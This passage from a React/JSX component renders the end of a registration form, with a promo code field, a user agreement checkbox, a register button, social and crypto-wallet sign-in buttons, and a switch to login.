                          onClick={() => setShowPromo(!showPromo)}
                        >
                          <div style={{ display: 'contents' }}>
                            {showPromo ? '− Hide promo code' : 'Add promo code'}
                          </div>
                        </button>
                        {showPromo && (
                          <div className="field-wrapper_root-xSBJ6 base-field_root-ttxw4" style={{ marginTop: '8px' }}>
                            <div className="field-wrapper_control-xSBJ6">
                              <input
                                type="text"
                                style={{ width: '100%', border: 'none', background: 'transparent', padding: '0 16px', outline: 'none', fontSize: '14px' }}
                                placeholder="Enter promo code"
                                value={regPromo}
                                onChange={(e) => setRegPromo(e.target.value)}
                              />
                            </div>
                          </div>
                        )}
                      </div>

                      {/* Terms */}
                      <div style={{ marginBottom: '16px' }}>
                        <label style={{ display: 'flex', alignItems: 'flex-start', gap: '8px', cursor: 'pointer', fontSize: '13px', color: '#6b7280' }}>
                          <input
                            type="checkbox"
                            checked={regAgreed}
                            onChange={(e) => {
                              setRegAgreed(e.target.checked);
                              if (e.target.checked) setRegAgreedErr('');
                            }}
                            style={{ marginTop: '3px' }}
                          />
                          <span>
                            By clicking Register, I accept the{' '}
                            <span style={{ color: '#2563eb' }}>User Agreement</span>
                          </span>
                        </label>
                        {regAgreedErr && (
                          <div style={{ color: '#ef4444', fontSize: '12px', marginTop: '2px', paddingLeft: '4px' }}>
                            {regAgreedErr}
                          </div>
                        )}
                      </div>

                      {/* Register Button */}
                      <button
                        className="base_root-V0GRR base_size-xl-V0GRR base_variant-accent-V0GRR base_isWide-V0GRR"
                        type="submit"
                        disabled={isSubmitting}
                      >
                        <div className="base_view-V0GRR">
                          <div className="base_content-V0GRR">
                            <div style={{ display: 'contents' }}>{isSubmitting ? 'Registering...' : 'Register'}</div>
                          </div>
                        </div>
                      </button>
                    </form>

                    <div className="sign-in_line-95Gcg sign-in_withText-95Gcg">or</div>

                    {/* OAuth / Social */}
                    <div className="oauth-buttons-container_root-cya6C sign-in_socials-95Gcg">
                      <div className="oauth-buttons-container_buttons-cya6C oauth-buttons-container_centered-cya6C">
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="Google">
                          <div className="base_view-HuD6g"><GoogleIcon /></div>
                        </button>
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="VK">
                          <div className="base_view-HuD6g"><VkIcon /></div>
                        </button>
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="Telegram">
                          <div className="base_view-HuD6g"><TelegramIcon /></div>
                        </button>
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="WalletConnect">
                          <div className="base_view-HuD6g"><WalletConnectIcon /></div>
                        </button>
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="MetaMask">
                          <div className="base_view-HuD6g"><MetaMaskIcon /></div>
                        </button>
                        <button className="base_root-HuD6g base_size-xl-HuD6g base_rootInteractive-HuD6g" type="button" aria-label="TrustWallet">
                          <div className="base_view-HuD6g"><TrustWalletIcon /></div>
                        </button>
                      </div>
                    </div>

                    {/* Already have an account? Log in */}
                    <div className="sign-in_register-95Gcg">
                      <div>Already have an account?</div>
                      <button
                        className="base_root-5XEcn base_size-m-semibold-5XEcn base_variant-accent-5XEcn"
                        type="button"
                        onClick={() => {
                          setAuthMode('login');
                          clearAllErrors();
                        }}
                      >
                        <div style={{ display: 'contents' }}>Log in</div>
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
